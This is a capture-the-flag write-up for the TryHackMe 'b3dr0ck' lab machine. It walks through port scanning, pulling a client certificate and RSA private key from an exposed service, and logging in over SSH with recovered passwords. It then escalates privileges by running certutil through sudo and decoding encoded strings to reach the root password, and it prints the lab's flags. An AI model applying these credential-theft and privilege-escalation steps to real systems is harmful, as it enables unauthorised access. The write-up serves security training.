# TryHackMe b3dr0ck Writeup

## `Nmap Scan`

```ruby
nmap -sCV 10.10.226.43
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 14:32 EDT
Nmap scan report for 10.10.226.43
Host is up (0.67s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 13:88:1a:0b:78:ff:aa:5d:13:de:7e:f2:c5:35:fc:a1 (RSA)
|   256 fb:45:3e:62:f4:21:8d:17:13:a6:da:c2:81:e0:db:f1 (ECDSA)
|_  256 78:cd:e3:91:f8:97:ce:4d:e0:61:6c:b5:2b:69:3f:dd (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.226.43:4040/
9009/tcp open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9009-TCP:V=7.95%I=7%D=10/9%Time=68E7FFB4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.60 seconds
                                                                           
```

> **`9009/tcp open  pichat?`** this port show banner :

```
nc -vv 10.10.226.43 9009
```

<img width="947" height="574" alt="image" src="https://github.com/user-attachments/assets/212418c4-21e8-4a9d-a21d-d4c143ba51c5" />

```
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

<img width="527" height="561" alt="image" src="https://github.com/user-attachments/assets/7aefff7d-3bc9-40ef-8952-079ffd3d1f3f" />

```
You use this service to recover your client certificate and private key
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMDkxODMxMjJaFw0yNjEwMDkxODMxMjJaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCtjfFh
k/me/UCb3xYGp6Nn6tl/gh7nl7CS8NLPobL2pBjhacLM2mQi3eUr6vryQimPC+13
w6DCrx909svvYryur1YvjT0BCYSy5q5DajAAKiSH2sw6AicNj5+a1Qaw6ibUFW7W
qQnwEYpsYfuHnkDDGMlLqjUpK3XDzxhZEVj6qDjxYI1KiEH4X6tIYbs4elFQOZ/l
U66jlvUjbkIFsjJiv27/fVh4hMPWaYqkQ578ew6fh6rkHJNvl/c1ICaQTsKS+uwu
5B2dboskaLFwTxDg5MxTf3AfyDnA1YUVuqUm82EoOLwC3HBJBGwYwte9f0XwmCrQ
9fMhYRNhtdmMrHD1AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAImLEz8dT0yNekge
oKOnRezTxSOyI1c/x/vpMWpFcyKMWxhls47eq3cd4WudaRnIfoY6328pkUP6L3av
ypa584d9kYwSEn5daGXitHZJnJRdqlXgjVseyWLrQAw2Hi5VgwspXtHZByQppXsq
yM3OhF83eI+9IYRV/p7iyd1OZYBwNcNENJtPhAXfDX38q0yz0Xr7X0w0yeXFuP7N
81C1TFW4Rjk4yggfzzAt2xcft/rWGEbfjP2n73m+JUIithBxxWKvb75uLQDxBXkl
RCxegJcbKUksgAzGV3EMjDsosPWaUEZiYJ/2+aXCg1U1vgX4xpj4HkfJGNeWJJ/L
aOHxVas=
-----END CERTIFICATE-----

What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEArY3xYZP5nv1Am98WBqejZ+rZf4Ie55ewkvDSz6Gy9qQY4WnC
zNpkIt3lK+r68kIpjwvtd8Ogwq8fdPbL72K8rq9WL409AQmEsuauQ2owACokh9rM
OgInDY+fmtUGsOom1BVu1qkJ8BGKbGH7h55AwxjJS6o1KSt1w88YWRFY+qg48WCN
SohB+F+rSGG7OHpRUDmf5VOuo5b1I25CBbIyYr9u/31YeITD1mmKpEOe/HsOn4eq
5ByTb5f3NSAmkE7CkvrsLuQdnW6LJGixcE8Q4OTMU39wH8g5wNWFFbqlJvNhKDi8
AtxwSQRsGMLXvX9F8Jgq0PXzIWETYbXZjKxw9QIDAQABAoIBAFD/X9oEb4lt9EtK
sELm1fJXvq4tkjLPro7Faf2RH67QIvSAoXNtsTI8kQoQHpIVosOp82fjmxGBHZM+
4yqT0C9OkVCcAA6N3KqJ0maQFlrdUDM/P/UKsCM6FmjyZq8GeJyebB4uwf6SkSHI
ENXYW60x0jBH/Yt7RvjdnCVlXTuNpZBqWbTe7UDuLK9jBkkW4rtcKkzcCIRisHTp
0dtflFxuHolstjeYDDAqp/b+GfWEa+u75eKN/Jn9mNY8HKltopYz0FhBqhqJNVYi
60hIg98O3v7kFxdqp70PfKSj3ZC7ndpJh+fbbXiBIfhMOgbDWMeyrJuRGXcuGs8d
aA38WjkCgYEA5k74GcO/eblim22FFgxgti6+ys+H/ZDmkArgmoKxzU9yC28zdzyy
tbBKrUyGKqtREx3LyKyF061YNTmx+EkGXFf5m4i4UqvQJgi5d+kQdW0ZveMiJTYX
NZI06B79qx6jI0JLUwx71gqRUtOx+TAmZmm+udBbWYISJND3C0E9v4MCgYEAwOo4
02r9upIn88T4BG/V8hdlH7O7V5zU4V/pjHvgCgt/YdwovP1cz/WNOm9gPWW3lpCv
GQTiq6vdzpJhhKAmvFc9258Sx9hl1Sb/lH+YociSz4Q1ZvBwjxLc3Jtm92qD6Yw1
NHSENqS1ENrAIZHOHymMBI+HoBkksqCLuShTbCcCgYAI78GCxmy0nXPtEgfa/in2
h8PRfNILDcdUiYeDl1Ss4ctMFEmL8+f/UtLi/JgsKa+grUROChu7RfupPQ7h0nuT
s7o0xc5ZLt+JykbgF0QTOmOIUbrudLXb10uEQkeXjz3HTXg8xbw8ZvaSnzJFuA+V
Y78J2MLiq0Bm+1DKuAJcXwKBgH/KaAw8ook1ijujrbuarbmpn7YpZB98Z1RIKbiC
0n008pPLuDzBBPtJKN2dq73gJIYbn7HOF60qs0rEks69HAvFKtfR/yndAk/5fnJL
N7tr1zyZ0po3CgjssNt+Ie4hY/KQiyoNSQu9fagFkCJsqILiDbtzrJ70KOgfC4+C
1AgfAoGBAMZpH7UhfsdYljB1j2um1HpE+AYSITzN04hfmFPKhbVSuk/jXt2A6Q5F
7im1lSdtBhICfY4MWU46ctKoPMShSLO7z1WFkDJ3GBqhFWFWzLU+xsGwr6Kc+Tel
UeQWNDon53gPJl7ZFcN6ndd4Kr+EriyiuMWI0ypZ1a0JVeMmDc3L
-----END RSA PRIVATE KEY-----

What are you looking for? 
                                                                                    
```

> ## make new Two files **`Barney.key`** **`Barney.key`**

<img width="1187" height="205" alt="image" src="https://github.com/user-attachments/assets/1d23590d-8c8b-4fd9-8fed-20e4ed5ffabb" />

> ## now connect

```ruby
socat stdio ssl:10.10.226.43:54321,cert=Barney.crt,key=Barney.key,verify=0
```

<img width="850" height="365" alt="image" src="https://github.com/user-attachments/assets/2a416853-2303-45e3-92e4-988700c9c8ea" />

```
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

## login to ssh 

```
ssh barney@10.10.226.43
password : d1ad7c0a3805955a35eb260dab4180dd
```

<img width="738" height="183" alt="image" src="https://github.com/user-attachments/assets/3ef6d5af-a30d-4c64-870b-1f04d9a78533" />

```
THM{f05780f08f0eb1de65023069d0e4c90c}
```

<img width="1090" height="349" alt="image" src="https://github.com/user-attachments/assets/6e732b11-d73f-4689-bc22-91d5bd92a0a2" />

> ## after some search found users `certs` and `keys`

<img width="950" height="186" alt="image" src="https://github.com/user-attachments/assets/40a3d27e-3cd0-4ff9-9d72-3a59f6fa8423" />

> we can use **`/usr/bin/certutil`** to read **`key`** and **`cert`** of **`fred`** user because we don't have permisson

<img width="757" height="104" alt="image" src="https://github.com/user-attachments/assets/3da8c591-b377-405c-9f19-98726e56104a" />

```
sudo /usr/bin/certutil fred "Fred Flintstone" > /tmp/fred_out.txt
```

<img width="955" height="699" alt="image" src="https://github.com/user-attachments/assets/f9bbddee-54ee-4405-a8f3-f0459fd9646e" />

> make two new files 

<img width="621" height="156" alt="image" src="https://github.com/user-attachments/assets/c3fddeda-b900-4612-9c41-0667d04c4ff9" />

> connect 

```
socat stdio ssl:10.10.226.43:54321,cert=fred.crt,key=fred.key,verify=0
```

<img width="921" height="379" alt="image" src="https://github.com/user-attachments/assets/ac212fe6-5c2c-483e-b99c-db85379d326b" />

## fred password

```
YabbaDabbaD0000!
```

## connect to fred ssh 

```
ssh fred@10.10226.43
```

<img width="569" height="156" alt="image" src="https://github.com/user-attachments/assets/1bb38dcd-ec59-4169-ad56-526a75b36886" />

```
THM{08da34e619da839b154521da7323559d}
```

## getting root

> ### try to do same to server user but faild

<img width="938" height="109" alt="image" src="https://github.com/user-attachments/assets/a1e25776-241e-46e1-a6c5-70a656785073" />

---

<img width="1251" height="233" alt="image" src="https://github.com/user-attachments/assets/9e4c7f17-8309-4951-b7c4-465ac290bdc9" />

<img width="905" height="143" alt="image" src="https://github.com/user-attachments/assets/d8e4c51e-c4f4-4d40-b1ae-3e0011e40c93" />

```
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

```
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

<img width="1514" height="762" alt="image" src="https://github.com/user-attachments/assets/61cd49d1-33b6-43f4-8295-114c5674bec6" />

## root password 

```
a00a12aad6b7c16bf07032bd05a31d56
```

<img width="1454" height="475" alt="image" src="https://github.com/user-attachments/assets/edc70d6c-4f65-4c7c-82a7-92f6d51fe787" />

```
flintstonesvitamins
```

## LOGIN to root ssh

```
ssh root@10.10.226.43
```

<img width="800" height="173" alt="image" src="https://github.com/user-attachments/assets/e607963f-814c-4f29-a3c2-464115749d36" />

```
THM{de4043c009214b56279982bf10a661b7}
```

